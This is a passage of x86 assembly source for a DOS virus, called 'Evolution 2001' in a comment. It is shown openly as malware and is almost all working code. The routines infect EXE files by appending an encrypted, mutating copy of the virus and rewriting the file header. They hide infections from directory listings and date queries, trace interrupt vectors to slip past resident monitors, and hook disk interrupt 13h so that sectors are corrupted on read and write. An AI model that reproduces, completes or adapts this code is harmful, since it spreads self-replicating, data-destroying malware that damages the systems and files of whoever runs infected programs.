;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
org21h PROC
	pushf
	call cs:[ori21h]
	ret
org21h ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; org13h
; In  :
;   the same like int 13h
; Comment: call original interrupt 13h
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
org13h PROC
	pushf
	call cs:[ori13h]
	ret
org13h ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; swap_vectors
; In  :
;   nothing
; Comment: swap vectors 1bh & 24h
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
swap_vectors PROC
	push ax
	mov eax,[swap1bh]
	xchg eax,fs:[1bh*4]
	mov [swap1bh],eax
	mov eax,[swap24h]
	xchg eax,fs:[24h*4]
	mov [swap24h],eax
	pop ax
	ret
swap_vectors ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; close
; In  :
;   BX -> file handle to close file
; Comment: close file witch handle is in BX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
close PROC
	mov ah,3eh
	call org21h		; close!
	push ds
	mov ax,4301h
	mov cx,[attrib]
	lds dx,[path_pointer]
	call org21h		; put old attributes
	pop ds
	ret
close ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; rewind
; In  :
;   BX -> file handle to rewind
; Comment: rewind file witch handle is in BX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
rewind PROC
	xor cx,cx
	xor dx,dx
	mov ax,4200h
	call org21h	; rewind!
	ret
rewind ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; infecting
; In  :
;   BX -> file handle to infect
; Comment: infect file witch handle is in BX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
infecting PROC
	mov ah,3fh
	mov cx,20h
	mov dx,OFFSET headerEXE
	call org21h	; read header of EXE file
	cmp word ptr [headerEXE],'ZM'	; are you EXE???
	jne not_the_same	; it's not an EXE file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	movzx eax,word ptr [headerEXE+0004h]		   ; are you overlay
	dec ax		; get number of pages
	shl eax,9     ; multiply 512 - size of one page
	movzx ecx,word ptr [headerEXE+0002h]
	add eax,ecx	; in EAX size file readed from header
	cmp eax,[size_file]		; if different with size readed by lseek
	jne not_the_same	; then file is overlayed, so don't infect!
	call generate	; generate a mutation of -=ğ Evolution 2001 ğ=-
	mov di,OFFSET end_tmp+64
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	push eax                                           ; some calculates
	add eax,VIRSIZE+64+16	; add 64 for decode procedure & 16 for fill
	mov cx,ax
	and cx,511d
	mov word ptr [headerEXE+0002h],cx
	shr eax,9
	inc ax
	mov word ptr [headerEXE+0004h],ax	; write new size to header
	mov ax,word ptr [headerEXE+000eh]
	mov [di+old_ss],ax
	add word ptr [headerEXE+000eh],(VIRSIZE+64+16)/16+1 ; member old & set new value of SS
	mov ax,word ptr [headerEXE+0014h]
	mov [di+ip],ax
	mov word ptr [headerEXE+14h],0	; member old & set new IP
	pop eax
	shr eax,4       ; div 16
	inc eax         ; fill to 16 (to 1 in segment)
	mov ecx,eax
	shl ecx,4
	push ecx        ; preserve append point (in bytes) (with 16 fill)
	sub ax,word ptr [headerEXE+0008h] ; substract size of header in segs
	mov cx,word ptr [headerEXE+0016h]
	mov word ptr [headerEXE+0016h],ax ; write new CS
	sub ax,cx
	add ax,4		; for miss decode procedure!
	mov [di+dcs],ax                      ; calculate & store new dCS
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	call rewind                      		 ; write some bytes
	mov cx,20h
	mov dx,OFFSET headerEXE
	mov ah,40h
	call org21h	; write changed header
	pop dx
	pop cx
	push cx
	push dx
	mov ax,4200h
	call org21h	; go to end of victim with 16 fill
	call xor_it	; xor before write to victim
	pop eax
	sub eax,[size_file]
	sub eax,16
	neg eax		; calculate rem to 16
	mov cx,VIRSIZE+64
	add cx,ax       ; added size is always the same (new generation!)
	mov ah,40h
	mov dx,OFFSET end_tmp
	call org21h	; append virus on the end of victim
	mov si,100d
	call set_date	; refresh old date - add 100 years
not_the_same:
	ret
infecting ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; set_rw
; In  :
;   ES:DI -> pointer to actual SFT action
; Comment: member old mode & set new mode to read/write
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
set_rw PROC
	mov ax,es:[di+0002h]
	mov es:[di+0037h],ax   	; member original open mode
	mov word ptr es:[di+0002h],0002h    ; for now set read/write mode
	ret
set_rw ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; set_old
; In  :
;   ES:DI -> pointer to actual SFT action
; Comment: refresh old mode & fill to 0 buffer fields
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
set_old PROC
	mov ax,es:[di+0037h]
	mov es:[di+0002h],ax   	; refresh original open mode
	mov word ptr es:[di+0037h],0000h    ; fill to 0 reserved bytes
	ret
set_old ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; close_infecting
; In  :
;   BX -> file handle to infect
; Comment: infect file witch handle is in BX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
close_infecting PROC
	call get_date		; get last modify date
	cmp dx,51200d
	ja all_inf
	push bx			; preserve file descriptor
	mov ah,51h
	call org21h
	mov es,bx		; current PSP in ES
	les di,es:[0034h]	; get pointer to JFT
	pop bx                  ; refresh descriptor
	add di,bx               ; add number of descriptor to offset of JFT
	mov al,es:[di]		; get number of SFT
	cmp al,0ffh		; if handle is not used
	jz all_inf		; the no to infect
	call chain_SFT		; go!
	call set_rw		; write enable
	push di
	push es     		; preserve pointer to current SFT
	push bx
	call protect_test	; test of protect
	pop bx
	jc disk_prot		; disk is protected
	call ende               ; get file size
	call infecting          ; & infect it!
disk_prot:
	pop es
	pop di
	call set_old
all_inf:
	ret
close_infecting ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; stealth
; In  :
;   AH -> function to stealth (4eh or 4fh)
;   CX -> search attributes
;   DS:DX -> name mask
; Comment: infect file witch handle is in BX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
stealth PROC
	mov bp,sp	; it's must be!
	push es
	pop ds		; refresh DS
	call org21h	; call findfirst or findnext
	push cs
	pop ds		; set DS equal CS
	jc io_error	; if error then no change & end
	mov ah,2fh
	call org21h	; get DTA pointer to ES:BX
	cmp word ptr es:[bx+0018h],51200
	jb no_change
	sub word ptr es:[bx+0018h],51200
	sub dword ptr es:[bx+001ah],VIRSIZE+64+16
no_change:
	clc
end_with_error:
	lahf		; SZAPC to AH
	and ah,1        ; only CF
	and byte ptr [bp+26],0feh ; set CF on the stack to 0
	or [bp+26],ah   ; & enable or no value from AH
end_ok:
	call swap_vectors
	pop bx
	pop es
	pop ds
	popa
	iret
io_error:
	mov [bp+20],ax
	jmp end_with_error
stealth ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; date_stealth
; In  :
;   AX -> function to stealth (5700h or 5701h)
;   BX -> file handle
;   CX -> time to set
;   DX -> date to set
; Comment: infect file witch handle is in BX
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
date_stealth PROC
	mov bp,sp
	push ax
	push cx
	push dx		; preserve registers
	mov ax,5700h
	call org21h	; get date - it must do for all
	jc error_date
	cmp word ptr [bp-02],5700h ; if this should be get date
	jne read_write   ; not write new
	add sp,6	; delete preserved regs
	cmp dx,51200d   ; is this file infect
	jb no_subs
	sub dx,51200d   ; if yes then sub 100 years from date
no_subs:
	mov [bp+18],cx
	mov [bp+16],dx	; store got date & time to stack
	jmp no_change   ; good end
read_write:
	mov si,dx	; preserve date
	pop dx
	pop cx
	pop ax		; refresh registers
	cmp si,51200d   ; if read date is from infected file
	jb no_adds
	add dx,51200d   ; then to sets date add 100 years too
no_adds:
	call org21h     ; write it!
	jmp no_change
error_date:
	add sp,6	; delete preserved regs
	mov [bp+20],ax
	stc		; set error flag
	jmp end_with_error
date_stealth ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; setvect
; In  :
;   AH -> function 25h
;   AL -> interrupt number
;   ES:DX -> new vector to be used for specified interrupt
; Comment: set new vector for select interrupt
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
setvect PROC
	mov bp,sp
	cli		; disable interrupts
	mov si,OFFSET swap1bh	; set SI to swap1bh
	cmp al,1bh      ; if this equal
	je special      ; then jump
	cmp al,24h      ; if is this 24h
	jne no_special
	add si,4        ; add 4 - next dword
special:
	mov [si],dx
	mov [si+2],es	; set vector 1bh or 24h in swap variables
	jmp normal_end
no_special:
	movzx bx,al     ; number of vector to BX
	shl bx,2        ; now adress in BX
	mov fs:[bx],dx
	mov fs:[bx+2],es  ; set the vector!
normal_end:
	sti
	jmp end_ok
setvect ENDP

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;                                 FUNCTIONS
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; getvect
; In  :
;   AH -> function 35h
;   AL -> interrupt number
; Out:
;   ES:DX -> value of interrupt vector
; Comment: get value of select interrupt vector
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
getvect PROC
	mov bp,sp
	mov si,OFFSET swap1bh	; set SI to swap1bh
	cmp al,1bh      ; if this equal
	je special1     ; then jump
	cmp al,24h      ; if is this 24h
	jne no_special1
	add si,4        ; add 4 - next dword
special1:
	mov ax,[si+2]
	mov [bp+2],ax
	mov ax,[si]
	mov [bp+14],ax  ; get vector 1bh or 24h from the swap variables
	jmp end_ok
no_special1:
	movzx bx,al     ; number of vector to BX
	shl bx,2        ; now adress in BX (mul 4)
	mov ax,fs:[bx+2]
	mov [bp+2],ax
	mov ax,fs:[bx]
	mov [bp+14],ax   ; get the vector!
	jmp end_ok ; OK
getvect ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; chain_SFT
; In  :
;   AL -> number of SFT to find
; Out:
;   ES:DI -> pointer to found SFT
; Comment: find SFT select in AL
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
chain_SFT PROC
	push cs
	pop es
	mov di,OFFSET SFT_pointer
next_table:
	les di,es:[di]
	push di
	mov cx,es:[di+0004h]	; CX SFTs in this table
	add di,6		; move to first SFT in table
make_rw:
	or al,al		; if found then end
	jz end_chain
	add di,59d		; next SFT
	dec al
	loop make_rw		; looping read/write mode
	pop di
	jmp next_table
end_chain:
	pop ax
	ret
chain_SFT ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; protect_test
; In  :
;   BX -> descriptor of file to test
; Out :
;   CF -> 1 if disk is protect or 0 if not
; Comment: test of disk protect
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
protect_test PROC
	les di,es:[di+0007h]	; get pointer to DPB
	movzx si,es:[di]	; get file drive to SI
	cmp si,2                ; if it's greater or equal than 2 (hard drive)
	jge no_protect		; then no protect!
	push 40h
	pop es
	mov cx,0001h            ; track 0, sector 1
	mov dx,si		; drive from SI
	xor dh,dh		; head 0
	push cs
	pop es
	mov bx,OFFSET disk_buffer ; set pointer to buffer
	mov ax,0201h            ; read one sector
	call org13h		; read!
	mov ax,0301h
	call org13h		; write if you can
	jc protected            ; if not the protect!
no_protect:
	clc
protected:
	ret
protect_test ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; random
; In  :
;   AX -> range of random number (from 0 to AX-1)
; Out :
;   AX -> random number
; Comment: return number 'drawing of lots'
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
random PROC
	push ax
	mov ax,[seed]
	mov cx,31413
	mul cx
	add ax,13849
	mov [seed],ax
	pop cx
	mul cx
	mov ax,dx
	ret			; random function from TP6.0 book
random ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; step_work
; In  :
;   SI -> OFFSET to old vector of int EBX
;   DI -> OFFSET to new vector in resident of int EBX
;   BX -> number of tracing vector
;   AH -> test function
;   boundary -> bound of segment original vector
; Out :
;   tmp_intr -> original vector of traced interrupt
; Comment: step work - trace vectors for original & cheat
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
step_work PROC
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
	pushf
	push cs
	push OFFSET here	; for come back from INT
	pushf
	pop dx
	or dh,1               	; enable TF in flags
	push dx
	shl bx,2            	; multiply 4
	push word ptr fs:[bx+2]
	push word ptr fs:[bx] ; for go to int with step work
	iret            ; go direct to EBX vector
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
here:						; so, we have cheat vektor
	mov eax,[tmp_intr]
	mov es:[si+4],eax ; save original vector in resident (from BX!)
	mov edx,fs:[bx]
	mov es:[si],edx	  ; save old vektor in resident
	mov fs:[bx+2],es
	mov word ptr fs:[bx],di; set vector BX
	ret
step_work ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; test_it
; In  :
;   nothing
; Out :
;   CF EQ 1 if installed, or CF EQ 0 if you must install
; Comment: are you installed???
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
test_it PROC
	mov eax,0ffffffffh
	int 21h			; Here you're?
	cmp eax,12345678h
	je da
	clc
	ret
da:
	stc
	ret
test_it ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; chain
; In  :
;   CX -> starting segment
; Out :
;   BX -> optimal segment to install
; Comment: find optimal segment to install
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
chain PROC
	mov es,cx
	mov ax,es:[0001h]
	mov dx,es:[0003h]   ; in AX PID, in DX length of block
	or ax,ax
	jnz @@not_free
	cmp dx,(2*VIRSIZE+TMPSIZE)/16+1+1+4+1 ; xtra plus 1 (for reserve)
	jb @@not_free	; block must be greater than (see above)
	mov bx,cx
@@not_free:
	add cx,dx       ; next
	inc cx
	cmp byte ptr es:[0000h],5ah
	jnz chain
	ret
chain ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; select_seg
; In  :
;   nothing
; Out :
;   BX -> segment to install
; Comment: find segment to install (in UMB too!)
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
select_seg PROC
	mov ah,51h
	int 21h		; get PSP
	dec bx
	mov cx,bx	; select in low memory from this block
	call chain
	push 9fffh
	pop es
	cmp byte ptr es:[0000h],4dh	; maybe UMB present
	jne no_umb
	mov cx,es
	call chain  ; so select optimal block in UMB
no_umb:
	ret
select_seg ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; prepare_seg
; In  :
;   BX -> MCB segment's to prepare
; Out :
;   BX -> prepared segment to copy
; Comment: prepare segment to copy yourself there
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
prepare_seg PROC
	mov es,bx
	sub word ptr es:[0003h],(2*VIRSIZE+TMPSIZE)/16+1+1+4 ; plus 4 is for decode procedure, first plus 1 is for fill, second is for MCB
	add bx,es:[0003h]
	inc bx
	cmp byte ptr es:[0000h],5ah
	je cut			; if it's last block then cut not insert!
	mov es,bx
	inc bx
	mov byte ptr es:[0000h],4dh	; set type of new block
	mov es:[0001h],bx	; set PID for yourself
	mov word ptr es:[0003h],(2*VIRSIZE+TMPSIZE+4)/16+1+1+4-1 ; minus one for MCB
cut:
	ret
prepare_seg ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; open
; In  :
;   AL -> access mode
;   ES:DX -> path to action file
; Out :
;   CF EQ 1 & in AX code of error if error occured, CF EQ 0 if okay & in AX
;   file handle
; Comment: open file which name is in ES:DX string, get attributes
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
open PROC
	push es
	pop ds
	mov si,ax
	mov ax,4300h
	call org21h	; get attributes
	jc open_fail
	mov cs:[attrib],cx ; store original attrib of victim
	mov ax,4301h
	xor cx,cx
	call org21h	; set none attributes
	jc open_fail	; put new attributes
	mov ax,si
	mov ah,3dh
	call org21h
open_fail:
	push cs
	pop ds			; refresh DS
	ret
open ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; get_date
; In  :
;   BX -> file descriptor
; Out :
;   in 'date' variable date of last modify of victim
;   CX & DX - time & date
; Comment: get last modify date of victim
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
get_date PROC
	mov ax,5700h
	call org21h		; get date last modification
	mov word ptr [date],cx
	mov word ptr [date+2],dx ; write it to variable!
	ret
get_date ENDP

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; infected
; In  :
;   ES:DX -> path to action file
; Out :
;   CF EQ 1 if file is already infected, CF EQ 0 if not & in BX descriptor
;   if on in AH EQ 3dh then return is NEGATIVE that above.
; Comment: test file for infected
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
infected PROC
	mov cl,7fh
	cmp ah,3dh
	jne not_open_file
	sub cl,3  	; for open file return value is NEGATIVE!
not_open_file:
	mov [cond],cl
	mov word ptr [path_pointer],dx
	mov word ptr [path_pointer+2],es	; store path_pointer
	mov al,02h
	call open
	jc open_error           ; if error then go end
	mov bx,ax               ; descriptor is in BX forever
	call get_date		; get last modify date
	shr dx,9
	cmp dx,100d
cond LABEL BYTE
	jg ok_infect
	jmp ende     	; if not infected then CF=0 & in BX descriptor opened file
ok_infect:
	call close
open_error:
	stc
	ret
ende:
	mov ax,4202h
	xor cx,cx
	xor dx,dx
	call org21h	; get file size
	mov word ptr [size_file],ax
	mov word ptr [size_file+2],dx
	call rewind	; rewind
	clc
	ret
infected ENDP

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;                                INTERRUPTS
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; interrupt 01h - step work
; Comment: trace interrupt
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
;       FLAGS		 +08
;       CS               +06
;       IP               +04
int01h:
	push bx         ;+02
	push bp		;+00
	mov bp,sp
	mov bx,[bp+6]
	cmp bx,cs:[boundary]
conditional LABEL BYTE
	ja not_yet
	mov ebx,[bp+4]		  ; if true then store it in original vector!
	mov cs:[tmp_intr],ebx
	and byte ptr [bp+9],0feh ; disable trace - mission successfully
not_yet:
	pop bp
	pop bx
	iret

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; interrupt 01h - step work bis
; Comment: trace decode procedure
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
;       FLAGS		 +08
;       CS               +06
;       IP               +04
int01h_bis:
	push bx         ;+02
	push bp		;+00
	mov bp,sp
	mov bx,[bp+6]
	cmp bx,cs:[boundary]
	jne not_yet_bis
	pop bp
	pop bx
	pop ax
	pop ax
	pop ax	; pop all from stack
	jmp come_back ; & come back
not_yet_bis:
	pop bp
	pop bx
	iret


;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; interrupt 09h - keyboard
; Comment: swap for balls
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
int09h:
	pusha
	push ds
	push es         ; yes! pushall
	push fs
	push 0
	pop fs		; set FS to IDT
	push cs
	pop ds          ; set DS equal CS
	cld		; no tricks!
	in al,60h  	; get key from port
	mov ah,al       ; to AH key
	and al,127d     ; in AL key but not specify is press/was press
	cmp al,056d     ; maybe ALT
	jne no_alt
	mov al,1        ; if yes set bit 1
	jmp login
no_alt:
	cmp al,029d     ; maybe CTRL
	jne no_ctrl
	mov al,2        ; set bit 2
	jmp login
no_ctrl:
	cmp al,083d     ; maybe Delete
	jne not_now
	mov al,4        ; set bit 3
login:
	mov bl,[kb_flag] ; to BL current KB_FLAG
	and bl,al        ; only select bit in BL
	sar ah,8         ; fill AH sign bit
	xor bl,ah        ; XOR it!
	not bl           ; & NOT
	and bl,al        ; only changed select bit in BL
	xor [kb_flag],bl ; set new KB_FLAG - I'm a genius (see the logical action - no conditionals & compares!)
	cmp [kb_flag],7d
	jne not_now	 ; if not CTRL-ALT-Delete then jump
	mov eax,fs:[046ch] ; get time
	cmp eax,262173d  ; maybe 4 o'clock?
	jb only_reset
	cmp eax,393260d  ; maybe 6 o'clock?
	ja only_reset
	call reset_logo  ; print reset logo
	call wait_a_moment ; wait
only_reset:
	push 0f000h
	push 0fff0h
	retf		 ; reset machine!
not_now:
	pop fs
	pop es
	pop ds
	popa		; pop all!
	jmp cs:[old09h] ; go to original int

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; interrupt 13h - disk
; Comment: swap for make errors on disks
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
int13h:
	cmp ah,02h
	je io_rw
	cmp ah,03h
	jne no_io       ; only read & write
io_rw:
	pusha
	push ds
	push es		; push all
	push cs
	pop ds          ; set DS equal CS
	mov bp,sp	; for operation on the stack
	call kill_sector ; kill sector before write
	pushf
	call [old13h]   ; read or write by old vector not original!!!
	jnc no_errors_detected
	mov [bp+18],ax
no_errors_detected:
	lahf		; SZAPC to AH
	and ah,1        ; only CF
	and byte ptr [bp+24],0feh ; set CF on the stack to 0
	or [bp+24],ah   ; & enable or no value from AH
	inc [sector]	; repeat number :)
	call kill_sector ; kill sector after read
	pop es
	pop ds
	popa            ; pop all
	iret
no_io:
	jmp cs:[old13h]

;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
; interrupt 21h - DOS's functions
; Comment: swap to infect other files
;°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
int21h:
	cmp eax,0ffffffffh
	jne no_test
	mov eax,12345678h
	iret			; set if test
no_test:
	cld
	sti
	pusha
	push ds
	push es
	push ds
	pop es			; set ES equal DS (DS is on the input path)
	push cs
	pop ds			; set DS equal CS
	push [intr_seg]
	pop fs                  ; set FS equal IDT

	call swap_vectors
	cmp ah,3dh      	; maybe open file
	jne no_open
	call infected           ; if yes then test infected of this file
	jc end21h
